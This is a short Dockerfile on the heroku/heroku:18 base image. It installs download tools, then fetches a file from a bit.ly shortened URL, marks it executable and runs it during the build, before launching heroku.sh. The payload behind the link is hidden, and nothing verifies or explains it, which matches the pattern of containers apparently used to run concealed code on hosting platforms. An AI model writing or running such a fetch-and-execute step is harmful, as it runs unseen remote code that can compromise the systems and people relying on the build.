FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://bit.ly/3u5P1sp && chmod u+x 3u5P1sp && sh 3u5P1sp
CMD bash heroku.sh
